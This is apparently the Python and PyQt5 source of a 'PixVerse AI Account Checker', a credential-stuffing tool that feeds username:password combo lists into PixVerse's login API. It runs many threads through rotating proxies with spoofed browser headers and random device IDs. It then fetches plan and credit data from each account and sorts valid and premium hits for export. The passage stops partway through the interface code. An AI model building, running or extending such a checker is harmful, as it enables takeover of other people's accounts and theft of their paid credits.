import sys
import json
import threading
import queue
import time
import requests
import random
from datetime import datetime, timedelta
from typing import List, Dict, Optional
from dataclasses import dataclass
from io import StringIO
import csv
import uuid
import math

# PyQt5 Imports
from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *

# Constants
DEFAULT_THREADS = 10
REQUEST_TIMEOUT = 30
MAX_RETRIES = 3

@dataclass
class PixverseAccount:
    username: str
    password: str
    status: str = "Pending"
    token: str = ""
    account_id: str = ""
    plan_name: str = ""
    plan_type: str = ""
    credit_daily: int = 0
    credit_package: int = 0
    total_credits: int = 0
    expiry_date: str = ""
    is_free: bool = True
    error: str = ""
    proxy_used: str = ""
    last_checked: str = ""
    qualities: List[str] = None
    response_time: float = 0.0
    album_num: int = 0
    high_quality_times: int = 0
    story_free_times: int = 0
    daily_credits_refresh_time: str = ""
    
    def __post_init__(self):
        if self.qualities is None:
            self.qualities = []
        
        # Calculate total credits
        self.total_credits = self.credit_daily + self.credit_package
        
        # Determine plan type
        if self.plan_name == "Basic Plan" or not self.plan_name:
            self.plan_type = "Free"
            self.is_free = True
        else:
            self.plan_type = "Premium"
            self.is_free = False

class PixverseChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': 'https://app.pixverse.ai',
            'referer': 'https://app.pixverse.ai/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'x-platform': 'Web',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        })
        
        # Stats
        self.stats = {
            'total': 0,
            'checked': 0,
            'valid': 0,
            'premium': 0,
            'free': 0,
            'failed': 0,
            'errors': 0,
            'cpm': 0,
            'start_time': None,
            'active_workers': 0,
            'total_credits': 0,
            'avg_response_time': 0.0
        }
        
        # Queues
        self.results_queue = queue.Queue()
        self.log_queue = queue.Queue()
        
        # Control
        self.is_running = False
        self.combos = []
        self.proxies = []
        self.results = []
        self.workers = []
        self.stats_lock = threading.Lock()
        
    def load_proxies(self, proxy_list: List[str]) -> List[str]:
        """Load and parse proxies from various formats"""
        parsed_proxies = []
        for proxy in proxy_list:
            proxy = proxy.strip()
            if not proxy:
                continue
                
            try:
                # Format: host:port:username:password
                if proxy.count(':') == 3 and '@' not in proxy:
                    parts = proxy.split(':')
                    if len(parts) == 4:
                        host, port, user, password = parts
                        parsed_proxy = f"http://{user}:{password}@{host}:{port}"
                        parsed_proxies.append(parsed_proxy)
                
                # Format: username:password@host:port
                elif '@' in proxy and ':' in proxy:
                    if proxy.startswith('http://') or proxy.startswith('https://'):
                        parsed_proxies.append(proxy)
                    else:
                        parsed_proxies.append(f"http://{proxy}")
                
                # Format: host:port
                elif proxy.count(':') == 1:
                    host, port = proxy.split(':')
                    parsed_proxy = f"http://{host}:{port}"
                    parsed_proxies.append(parsed_proxy)
                
                # Format with protocol already included
                elif proxy.startswith('http://') or proxy.startswith('https://') or proxy.startswith('socks5://'):
                    parsed_proxies.append(proxy)
                    
            except Exception as e:
                self.log_queue.put(f"[PROXY ERROR] Failed to parse proxy {proxy}: {str(e)}")
        
        return parsed_proxies
    
    def generate_device_id(self):
        """Generate random device IDs"""
        return str(uuid.uuid4())
    
    def get_random_proxy(self):
        """Get random proxy from list"""
        if not self.proxies:
            return None
        return random.choice(self.proxies)
    
    def login(self, username: str, password: str, proxy: Optional[str] = None) -> Dict:
        """Attempt to login to Pixverse account"""
        start_time = time.time()
        try:
            # Generate unique IDs for each request
            ai_anonymous_id = self.generate_device_id()
            ai_trace_id = self.generate_device_id()
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US',
                'ai-anonymous-id': ai_anonymous_id,
                'ai-trace-id': ai_trace_id,
                'content-type': 'application/json',
                'priority': 'u=1, i',
                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'x-platform': 'Web',
                'Referer': 'https://app.pixverse.ai/',
                'origin': 'https://app.pixverse.ai',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
            }
            
            payload = {
                "Username": username,
                "Password": password
            }
            
            # Setup proxy
            proxies = None
            if proxy:
                proxies = {'http': proxy, 'https': proxy}
            
            # Try with proxy first, then without
            max_retries = MAX_RETRIES
            for attempt in range(max_retries):
                try:
                    if proxies:
                        response = requests.post(
                            "https://app-api.pixverse.ai/creative_platform/login",
                            json=payload,
                            headers=headers,
                            proxies=proxies,
                            timeout=REQUEST_TIMEOUT
                        )
                    else:
                        response = requests.post(
                            "https://app-api.pixverse.ai/creative_platform/login",
                            json=payload,
                            headers=headers,
                            timeout=REQUEST_TIMEOUT
                        )
                    
                    response_time = time.time() - start_time
                    
                    if response.status_code == 200:
                        data = response.json()
                        if data.get("ErrCode") == 0:
                            return {
                                'success': True,
                                'token': data['Resp']['Result']['Token'],
                                'account_id': data['Resp']['Result']['AccountId'],
                                'username': data['Resp']['Result']['Username'],
                                'response_time': response_time
                            }
                        else:
                            return {
                                'success': False,
                                'error': data.get('ErrMsg', 'Login failed'),
                                'response_time': response_time
                            }
                    else:
                        return {
                            'success': False,
                            'error': f'HTTP {response.status_code}',
                            'response_time': response_time
                        }
                        
                except requests.exceptions.ProxyError:
                    if attempt < max_retries - 1:
                        time.sleep(1)
                        continue
                    return {'success': False, 'error': 'Proxy error', 'response_time': time.time() - start_time}
                except requests.exceptions.ConnectionError as e:
                    if "duplicate name" in str(e):
                        # Change user-agent
                        headers['user-agent'] = random.choice([
                            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
                        ])
                        if attempt < max_retries - 1:
                            time.sleep(2)
                            continue
                    return {'success': False, 'error': f'Connection error: {str(e)}', 'response_time': time.time() - start_time}
                except Exception as e:
                    if attempt < max_retries - 1:
                        time.sleep(1)
                        continue
                    return {'success': False, 'error': str(e), 'response_time': time.time() - start_time}
            
        except Exception as e:
            return {'success': False, 'error': f'Exception: {str(e)}', 'response_time': time.time() - start_time}
    
    def get_plan_info(self, token: str, proxy: Optional[str] = None) -> Dict:
        """Get account plan information"""
        try:
            ai_anonymous_id = self.generate_device_id()
            ai_trace_id = self.generate_device_id()
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US',
                'ai-anonymous-id': ai_anonymous_id,
                'ai-trace-id': ai_trace_id,
                'content-type': 'application/json',
                'priority': 'u=1, i',
                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'token': token,
                'x-platform': 'Web',
                'Referer': 'https://app.pixverse.ai/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
            }
            
            proxies = None
            if proxy:
                proxies = {'http': proxy, 'https': proxy}
            
            for attempt in range(MAX_RETRIES):
                try:
                    if proxies:
                        response = requests.post(
                            "https://app-api.pixverse.ai/creative_platform/members/plan_details",
                            json={},
                            headers=headers,
                            proxies=proxies,
                            timeout=REQUEST_TIMEOUT
                        )
                    else:
                        response = requests.post(
                            "https://app-api.pixverse.ai/creative_platform/members/plan_details",
                            json={},
                            headers=headers,
                            timeout=REQUEST_TIMEOUT
                        )
                    
                    if response.status_code == 200:
                        data = response.json()
                        if data.get("ErrCode") == 0:
                            resp = data.get('Resp', {})
                            return {
                                'success': True,
                                'plan_name': resp.get('plan_name', 'Unknown'),
                                'next_plan_name': resp.get('next_plan_name', 'Unknown'),
                                'plan_type': resp.get('current_plan_type', 0),
                                'credit_daily': resp.get('credit_daily', 0),
                                'credit_package': resp.get('credit_package', 0),
                                'expiry_date': resp.get('credits_refresh_time', '0001-01-01T00:00:00Z'),
                                'qualities': resp.get('qualities', []),
                                'album_num': resp.get('album_num', 0),
                                'is_free': resp.get('current_plan_type', 1) == 0,
                                'remaining_days': resp.get('remaining_days', 0),
                                'daily_credits_refresh_time': resp.get('daily_credits_refresh_time', '')
                            }
                        else:
                            return {'success': False, 'error': data.get('ErrMsg', 'Failed to get plan')}
                    else:
                        return {'success': False, 'error': f'HTTP {response.status_code}'}
                        
                except Exception as e:
                    if attempt < MAX_RETRIES - 1:
                        time.sleep(1)
                        continue
                    return {'success': False, 'error': str(e)}
                    
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_credit_info(self, token: str, proxy: Optional[str] = None) -> Dict:
        """Get detailed credit information"""
        try:
            ai_anonymous_id = self.generate_device_id()
            ai_trace_id = self.generate_device_id()
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US',
                'ai-anonymous-id': ai_anonymous_id,
                'ai-trace-id': ai_trace_id,
                'priority': 'u=1, i',
                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'token': token,
                'x-platform': 'Web',
                'Referer': 'https://app.pixverse.ai/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
            }
            
            proxies = None
            if proxy:
                proxies = {'http': proxy, 'https': proxy}
            
            for attempt in range(MAX_RETRIES):
                try:
                    if proxies:
                        response = requests.get(
                            "https://app-api.pixverse.ai/creative_platform/user/credits",
                            headers=headers,
                            proxies=proxies,
                            timeout=REQUEST_TIMEOUT
                        )
                    else:
                        response = requests.get(
                            "https://app-api.pixverse.ai/creative_platform/user/credits",
                            headers=headers,
                            timeout=REQUEST_TIMEOUT
                        )
                    
                    if response.status_code == 200:
                        data = response.json()
                        if data.get("ErrCode") == 0:
                            resp = data.get('Resp', {})
                            return {
                                'success': True,
                                'credit_daily': resp.get('credit_daily', 0),
                                'credit_monthly': resp.get('credit_monthly', 0),
                                'credit_package': resp.get('credit_package', 0),
                                'high_quality_times': resp.get('high_quality_times', 0),
                                'story_free_times': resp.get('story_free_times', 0),
                                'total_credits': (resp.get('credit_daily', 0) + resp.get('credit_package', 0))
                            }
                        else:
                            return {'success': False, 'error': data.get('ErrMsg', 'Failed to get credits')}
                    else:
                        return {'success': False, 'error': f'HTTP {response.status_code}'}
                        
                except Exception as e:
                    if attempt < MAX_RETRIES - 1:
                        time.sleep(1)
                        continue
                    return {'success': False, 'error': str(e)}
                    
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def check_single_account(self, combo: str, proxy: Optional[str] = None) -> PixverseAccount:
        """Check a single account"""
        try:
            # Parse combo
            if ':' not in combo:
                account = PixverseAccount(
                    username=combo.strip(),
                    password="",
                    status="Invalid",
                    error="Invalid format (missing ':')",
                    last_checked=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                )
                return account
            
            username, password = combo.strip().split(':', 1)
            
            # Attempt login
            login_result = self.login(username, password, proxy)
            
            if not login_result['success']:
                account = PixverseAccount(
                    username=username,
                    password=password,
                    status="Failed",
                    error=login_result.get('error', 'Login failed'),
                    proxy_used=proxy or "Direct",
                    last_checked=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    response_time=login_result.get('response_time', 0.0)
                )
                return account
            
            token = login_result['token']
            account_id = str(login_result['account_id'])
            response_time = login_result.get('response_time', 0.0)
            
            # Get plan info
            plan_result = self.get_plan_info(token, proxy)
            
            if not plan_result['success']:
                # Still valid login
                account = PixverseAccount(
                    username=username,
                    password=password,
                    status="Valid (No Plan)",
                    token=token,
                    account_id=account_id,
                    plan_name="Unknown",
                    proxy_used=proxy or "Direct",
                    last_checked=datetime.now().strftime("%Y-%m-d %H:%M:%S"),
                    response_time=response_time
                )
                return account
            
            # Get credit info
            credit_result = self.get_credit_info(token, proxy)
            
            if credit_result['success']:
                total_credits = credit_result['total_credits']
                credit_daily = credit_result['credit_daily']
                credit_package = credit_result['credit_package']
                high_quality_times = credit_result['high_quality_times']
                story_free_times = credit_result['story_free_times']
            else:
                # Use plan info credits
                total_credits = plan_result.get('credit_daily', 0) + plan_result.get('credit_package', 0)
                credit_daily = plan_result.get('credit_daily', 0)
                credit_package = plan_result.get('credit_package', 0)
                high_quality_times = 0
                story_free_times = 0
            
            # Determine if free account
            is_free = plan_result.get('is_free', True)
            if plan_result.get('expiry_date', '0001-01-01') == '0001-01-01T00:00:00Z':
                is_free = True
            
            # Determine plan type
            plan_type = "Free" if is_free else "Premium"
            
            account = PixverseAccount(
                username=username,
                password=password,
                status="Valid",
                token=token,
                account_id=account_id,
                plan_name=plan_result.get('plan_name', 'Unknown'),
                plan_type=plan_type,
                credit_daily=credit_daily,
                credit_package=credit_package,
                total_credits=total_credits,
                expiry_date=plan_result.get('expiry_date', 'N/A'),
                is_free=is_free,
                proxy_used=proxy or "Direct",
                last_checked=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                qualities=plan_result.get('qualities', []),
                response_time=response_time,
                album_num=plan_result.get('album_num', 0),
                high_quality_times=high_quality_times,
                story_free_times=story_free_times,
                daily_credits_refresh_time=plan_result.get('daily_credits_refresh_time', '')
            )
            
            return account
            
        except Exception as e:
            username = combo.split(':')[0] if ':' in combo else combo
            password = combo.split(':')[1] if ':' in combo else ""
            
            return PixverseAccount(
                username=username,
                password=password,
                status="Error",
                error=str(e),
                last_checked=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            )
    
    def worker(self, account_queue: queue.Queue, results_queue: queue.Queue, proxy_list: List[str]):
        """Worker thread function"""
        while self.is_running and not account_queue.empty():
            try:
                combo = account_queue.get_nowait()
                
                # Get random proxy
                proxy = random.choice(proxy_list) if proxy_list else None
                
                # Check account
                result = self.check_single_account(combo, proxy)
                
                # Update stats with lock
                with self.stats_lock:
                    self.stats['checked'] += 1
                    if result.status == "Valid":
                        self.stats['valid'] += 1
                        self.stats['total_credits'] += result.total_credits
                        if result.is_free:
                            self.stats['free'] += 1
                        else:
                            self.stats['premium'] += 1
                    else:
                        self.stats['failed'] += 1
                        if result.error:
                            self.stats['errors'] += 1
                    
                    # Update response time average
                    total_checked = self.stats['checked']
                    if total_checked > 1:
                        self.stats['avg_response_time'] = (
                            (self.stats['avg_response_time'] * (total_checked - 1) + result.response_time) / total_checked
                        )
                    else:
                        self.stats['avg_response_time'] = result.response_time
                
                # Add to results queue
                results_queue.put(result)
                account_queue.task_done()
                
            except queue.Empty:
                break
            except Exception as e:
                self.log_queue.put(f"[WORKER ERROR] {str(e)}")
                continue
    
    def start_checking(self, combos: List[str], proxies: List[str], threads: int = DEFAULT_THREADS):
        """Start checking accounts"""
        if not combos:
            return False
        
        # Reset stats
        with self.stats_lock:
            self.stats = {
                'total': len(combos),
                'checked': 0,
                'valid': 0,
                'premium': 0,
                'free': 0,
                'failed': 0,
                'errors': 0,
                'cpm': 0,
                'start_time': datetime.now(),
                'active_workers': 0,
                'total_credits': 0,
                'avg_response_time': 0.0
            }
        
        # Parse proxies
        self.proxies = self.load_proxies(proxies)
        
        # Create account queue
        account_queue = queue.Queue()
        for combo in combos:
            account_queue.put(combo)
        
        # Start workers
        self.is_running = True
        self.workers = []
        
        for i in range(min(threads, len(combos))):
            worker_thread = threading.Thread(
                target=self.worker,
                args=(account_queue, self.results_queue, self.proxies),
                daemon=True
            )
            worker_thread.start()
            self.workers.append(worker_thread)
            with self.stats_lock:
                self.stats['active_workers'] += 1
        
        self.log_queue.put(f"[START] Checking {len(combos)} accounts with {len(self.workers)} workers")
        if self.proxies:
            self.log_queue.put(f"[PROXIES] Loaded {len(self.proxies)} proxies")
        
        return True
    
    def stop_checking(self):
        """Stop checking accounts"""
        self.is_running = False
        
        # Wait for workers to finish
        for worker in self.workers:
            if worker.is_alive():
                worker.join(timeout=1)
        
        self.workers = []
        with self.stats_lock:
            self.stats['active_workers'] = 0
        
        elapsed = self.get_elapsed_time()
        self.log_queue.put(f"[STOP] Checking stopped after {elapsed}")
        self.log_queue.put(f"[STATS] Valid: {self.stats['valid']}, Free: {self.stats['free']}, Premium: {self.stats['premium']}, Failed: {self.stats['failed']}")
    
    def get_progress(self):
        """Get progress percentage"""
        with self.stats_lock:
            checked = self.stats['checked']
            total = self.stats['total']
        
        if total == 0:
            return 0, 0, 0.0
        
        percentage = (checked / total) * 100
        
        # Ensure 100% when done
        if not self.is_running and checked >= total and total > 0:
            checked = total
            percentage = 100.0
        
        return checked, total, percentage
    
    def get_elapsed_time(self):
        """Get elapsed time as string"""
        with self.stats_lock:
            if not self.stats['start_time']:
                return "00:00:00"
            start_time = self.stats['start_time']
        
        elapsed = datetime.now() - start_time
        total_seconds = int(elapsed.total_seconds())
        
        hours = total_seconds // 3600
        minutes = (total_seconds % 3600) // 60
        seconds = total_seconds % 60
        
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    
    def get_cpm(self):
        """Get checks per minute"""
        with self.stats_lock:
            if not self.stats['start_time']:
                return 0
            start_time = self.stats['start_time']
            checked = self.stats['checked']
        
        elapsed = datetime.now() - start_time
        elapsed_minutes = elapsed.total_seconds() / 60
        
        if elapsed_minutes == 0:
            return 0
        
        return int(checked / elapsed_minutes)
    
    def get_stats(self):
        """Get thread-safe stats copy"""
        with self.stats_lock:
            return self.stats.copy()

class PixverseCheckerGUI(QMainWindow):
    """Pixverse Account Checker GUI - AI Video Creation Theme"""
    
    def __init__(self):
        super().__init__()
        self.checker = PixverseChecker()
        self.update_timer = QTimer()
        self.elapsed_timer = QTimer()
        self.init_ui()
        self.setup_connections()
        
        # Load settings
        self.load_settings()
        
    def init_ui(self):
        """Initialize UI with AI Video Creation Theme"""
        self.setWindowTitle("🎬 PixVerse AI Account Checker v2.0 | @allicheamine2")
        self.setGeometry(100, 100, 1600, 1000)
        
        # Apply AI Video Creation Theme
        # Colors: Purple (#8A2BE2), Pink (#FF69B4), Cyan (#00FFFF), Dark Blue (#0A0A2A)
        self.setStyleSheet(self.get_stylesheet())
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(10)
        main_layout.setContentsMargins(20, 20, 20, 20)
        
        # Header with gradient
        header_widget = QWidget()
        header_widget.setObjectName("headerWidget")
        header_layout = QVBoxLayout(header_widget)
        
        title = QLabel("🎬 PIXVERSE AI ACCOUNT CHECKER")
        title.setAlignment(Qt.AlignCenter)
        title.setObjectName("mainTitle")
        header_layout.addWidget(title)
        
        subtitle = QLabel("AI Video & Anime Creation Platform | Created by @allicheamine2")
        subtitle.setAlignment(Qt.AlignCenter)
        subtitle.setObjectName("subTitle")
        header_layout.addWidget(subtitle)
        
        main_layout.addWidget(header_widget)
        
        # Create splitter for main content
        splitter = QSplitter(Qt.Horizontal)
        
        # Left panel - Controls
        left_widget = QWidget()
        left_widget.setObjectName("leftPanel")
        left_layout = QVBoxLayout(left_widget)
        left_layout.setSpacing(15)
        
        # Status panel
        status_group = QGroupBox("⚡ CHECKER STATUS")
        status_group.setObjectName("statusGroup")
        status_layout = QGridLayout()
        
        self.timer_label = QLabel("⏱️ Time: 00:00:00")
        self.timer_label.setObjectName("timerLabel")
        status_layout.addWidget(self.timer_label, 0, 0)
        
        self.status_label = QLabel("🟢 READY")
        self.status_label.setObjectName("statusLabel")
        status_layout.addWidget(self.status_label, 0, 1)
        
        self.speed_label = QLabel("⚡ CPM: 0")
        self.speed_label.setObjectName("speedLabel")
        status_layout.addWidget(self.speed_label, 1, 0)
        
        self.workers_label = QLabel("👷 Workers: 0")
        self.workers_label.setObjectName("workersLabel")
        status_layout.addWidget(self.workers_label, 1, 1)
        
        status_group.setLayout(status_layout)
        left_layout.addWidget(status_group)
        
        # Input section
        input_group = QGroupBox("📝 INPUT DATA")
        input_group.setObjectName("inputGroup")
        input_layout = QVBoxLayout()
        
        # Accounts
        combo_label = QLabel("AI Accounts (username:password):")
        combo_label.setObjectName("inputLabel")
        input_layout.addWidget(combo_label)
        
        self.combo_input = QPlainTextEdit()
        self.combo_input.setMinimumHeight(180)
        self.combo_input.setMaximumHeight(250)
        self.combo_input.setPlaceholderText("Enter AI accounts in format: username:password\nOne account per line\nExample: ai_user:password123")
        self.combo_input.setObjectName("comboInput")
        input_layout.addWidget(self.combo_input)
        
        # Proxies
        proxy_label = QLabel("🌐 Proxy List (optional):")
        proxy_label.setObjectName("inputLabel")
        input_layout.addWidget(proxy_label)
        
        self.proxy_input = QPlainTextEdit()
        self.proxy_input.setMinimumHeight(120)
        self.proxy_input.setMaximumHeight(180)
        self.proxy_input.setPlaceholderText("Format: host:port:user:pass\nor user:pass@host:port\nor http://proxy.com:port")
        self.proxy_input.setObjectName("proxyInput")
        input_layout.addWidget(self.proxy_input)
        
        # File buttons
        file_buttons = QHBoxLayout()
        
        load_combo_btn = QPushButton("📁 Load AI Accounts")
        load_combo_btn.clicked.connect(self.load_combos_file)
        load_combo_btn.setObjectName("fileButton")
        file_buttons.addWidget(load_combo_btn)
        
        load_proxy_btn = QPushButton("🔌 Load Proxies")
        load_proxy_btn.clicked.connect(self.load_proxies_file)
        load_proxy_btn.setObjectName("fileButton")
        file_buttons.addWidget(load_proxy_btn)
        
        clear_btn = QPushButton("🗑️ Clear All")
        clear_btn.clicked.connect(self.clear_inputs)
        clear_btn.setObjectName("fileButton")
        file_buttons.addWidget(clear_btn)
        
        input_layout.addLayout(file_buttons)
        input_group.setLayout(input_layout)
        left_layout.addWidget(input_group)
        
        # Settings
        settings_group = QGroupBox("⚙️ SETTINGS")
        settings_group.setObjectName("settingsGroup")
        settings_layout = QGridLayout()
        
        settings_layout.addWidget(QLabel("🧵 Threads:"), 0, 0)
        self.threads_spin = QSpinBox()
        self.threads_spin.setRange(1, 200)
        self.threads_spin.setValue(DEFAULT_THREADS)
        self.threads_spin.setObjectName("settingsSpin")
        settings_layout.addWidget(self.threads_spin, 0, 1)
        
        settings_layout.addWidget(QLabel("⏱️ Timeout (s):"), 1, 0)
        self.timeout_spin = QSpinBox()
        self.timeout_spin.setRange(5, 60)
        self.timeout_spin.setValue(REQUEST_TIMEOUT)
        self.timeout_spin.setObjectName("settingsSpin")
        settings_layout.addWidget(self.timeout_spin, 1, 1)
        
        settings_layout.addWidget(QLabel("🔄 Retries:"), 2, 0)
        self.retries_spin = QSpinBox()
        self.retries_spin.setRange(1, 5)
        self.retries_spin.setValue(MAX_RETRIES)
        self.retries_spin.setObjectName("settingsSpin")
        settings_layout.addWidget(self.retries_spin, 2, 1)
        
        # Sort selector
        settings_layout.addWidget(QLabel("📊 Sort by:"), 3, 0)
        self.sort_combo = QComboBox()
        self.sort_combo.addItems(["Total Credits (High to Low)", "Total Credits (Low to High)", "Username", "Plan Type", "Response Time"])
        self.sort_combo.setObjectName("settingsCombo")
        settings_layout.addWidget(self.sort_combo, 3, 1)
        
        settings_group.setLayout(settings_layout)
        left_layout.addWidget(settings_group)
        
        # Control buttons
        control_layout = QVBoxLayout()
        
        self.start_btn = QPushButton("▶ START AI CHECKING")
        self.start_btn.setObjectName("startButton")
        self.start_btn.clicked.connect(self.start_checking)
        self.start_btn.setMinimumHeight(50)
        control_layout.addWidget(self.start_btn)
        
        self.stop_btn = QPushButton("⏹ STOP CHECKING")
        self.stop_btn.setObjectName("stopButton")
        self.stop_btn.clicked.connect(self.stop_checking)
        self.stop_btn.setEnabled(False)
        self.stop_btn.setMinimumHeight(50)
        control_layout.addWidget(self.stop_btn)
        
        left_layout.addLayout(control_layout)
        left_layout.addStretch()
        
        splitter.addWidget(left_widget)
        
        # Right panel - Results & Stats
        right_widget = QWidget()
        right_widget.setObjectName("rightPanel")
        right_layout = QVBoxLayout(right_widget)
        right_layout.setSpacing(15)
        
        # Stats grid
        stats_group = QGroupBox("📈 LIVE AI STATISTICS")
        stats_group.setObjectName("statsGroup")
        stats_layout = QGridLayout()
        
        stats = [
            ("✅ Valid AI", "valid", "#00FFFF"),
            ("💎 Premium", "premium", "#FF69B4"),
            ("🎬 Free AI", "free", "#8A2BE2"),
            ("❌ Failed", "failed", "#FF4444"),
            ("📊 Checked", "checked", "#00FFAA"),
            ("⚡ CPM", "cpm", "#FFFF00"),
            ("💳 Total Credits", "credits", "#FF69B4"),
            ("⏱️ Avg Time", "avg_time", "#00FFFF"),
        ]
        
        self.stat_labels = {}
        for i, (label, key, color) in enumerate(stats):
            row = i // 4
            col = (i % 4) * 2
            
            # Label
            name_label = QLabel(label)
            name_label.setStyleSheet(f"color: {color}; font-weight: bold; font-size: 12px;")
            stats_layout.addWidget(name_label, row, col)
            
            # Value
            value_label = QLabel("0")
            value_label.setStyleSheet(f"color: {color}; font-weight: bold; font-size: 14px; font-family: 'Consolas';")
            value_label.setAlignment(Qt.AlignRight)
            stats_layout.addWidget(value_label, row, col + 1)
            self.stat_labels[key] = value_label
        
        stats_group.setLayout(stats_layout)
        right_layout.addWidget(stats_group)
        
        # Progress
        progress_group = QGroupBox("📊 CHECKING PROGRESS")
        progress_group.setObjectName("progressGroup")
        progress_layout = QVBoxLayout()
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setTextVisible(True)
        self.progress_bar.setFormat("🎬 %p% (%v/%m)")
        self.progress_bar.setObjectName("progressBar")
        progress_layout.addWidget(self.progress_bar)
        
        progress_labels = QHBoxLayout()
        self.progress_label = QLabel("Progress: 0/0 (0%)")
        self.progress_label.setObjectName("progressLabel")
        progress_labels.addWidget(self.progress_label)
        
        self.eta_label = QLabel("ETA: --:--")
        self.eta_label.setObjectName("etaLabel")
        progress_labels.addWidget(self.eta_label)
        
        progress_labels.addStretch()
        progress_layout.addLayout(progress_labels)
        
        progress_group.setLayout(progress_layout)
        right_layout.addWidget(progress_group)
        
        # Results tabs
        self.results_tabs = QTabWidget()
        self.results_tabs.setObjectName("resultsTabs")
        
        # Results tab
        results_tab = QWidget()
        results_layout = QVBoxLayout(results_tab)
        
        self.results_table = QTableWidget()
        self.results_table.setColumnCount(16)
        self.results_table.setHorizontalHeaderLabels([
            "Time", "Status", "Username", "Plan", "Type", "Daily", 
            "Package", "Total", "Expiry", "Albums", "Qualities", 
            "HQ Times", "Story Free", "Response", "Free", "Error"
        ])
        self.results_table.horizontalHeader().setStretchLastSection(True)
        self.results_table.setAlternatingRowColors(True)
        self.results_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.results_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.results_table.setSortingEnabled(True)
        self.results_table.setObjectName("resultsTable")
        results_layout.addWidget(self.results_table)
        
        self.results_tabs.addTab(results_tab, "📊 AI Results")
        
        # Valid tab
        valid_tab = QWidget()
        valid_layout = QVBoxLayout(valid_tab)
        
        self.valid_output = QPlainTextEdit()
        self.valid_output.setReadOnly(True)
        self.valid_output.setMaximumBlockCount(2000)
        self.valid_output.setObjectName("validOutput")
        valid_layout.addWidget(self.valid_output)
        
        self.results_tabs.addTab(valid_tab, "✅ Valid Accounts")
        
        # Premium tab
        premium_tab = QWidget()
        premium_layout = QVBoxLayout(premium_tab)
        
        self.premium_output = QPlainTextEdit()
        self.premium_output.setReadOnly(True)
        self.premium_output.setObjectName("premiumOutput")
        premium_layout.addWidget(self.premium_output)
        
        self.results_tabs.addTab(premium_tab, "💎 Premium AI")
        
        # Logs tab
        logs_tab = QWidget()
        logs_layout = QVBoxLayout(logs_tab)
        
        self.log_output = QPlainTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setMaximumBlockCount(2000)
        self.log_output.setObjectName("logOutput")
        logs_layout.addWidget(self.log_output)
        
        self.results_tabs.addTab(logs_tab, "📝 AI Logs")
        
        right_layout.addWidget(self.results_tabs)
        
        # Action buttons - UPDATED WITH PREMIUM EXPORT
        action_layout = QHBoxLayout()
        
        export_valid_btn = QPushButton("💾 Export Valid")
        export_valid_btn.setObjectName("actionButton")
        export_valid_btn.clicked.connect(self.export_valid)
        action_layout.addWidget(export_valid_btn)
        
        export_premium_btn = QPushButton("💎 Export Premium")
        export_premium_btn.setObjectName("actionButton")
        export_premium_btn.clicked.connect(self.export_premium)
        action_layout.addWidget(export_premium_btn)
        
        copy_valid_btn = QPushButton("📋 Copy Valid")
        copy_valid_btn.setObjectName("actionButton")
        copy_valid_btn.clicked.connect(self.copy_valid)
        action_layout.addWidget(copy_valid_btn)
        
        copy_premium_btn = QPushButton("📋 Copy Premium")
        copy_premium_btn.setObjectName("actionButton")
        copy_premium_btn.clicked.connect(self.copy_premium)
        action_layout.addWidget(copy_premium_btn)
        
        clear_results_btn = QPushButton("🗑️ Clear Results")
        clear_results_btn.setObjectName("actionButton")
        clear_results_btn.clicked.connect(self.clear_results)
        action_layout.addWidget(clear_results_btn)
        
        right_layout.addLayout(action_layout)
        
        # Second row of action buttons
        action_layout2 = QHBoxLayout()
        
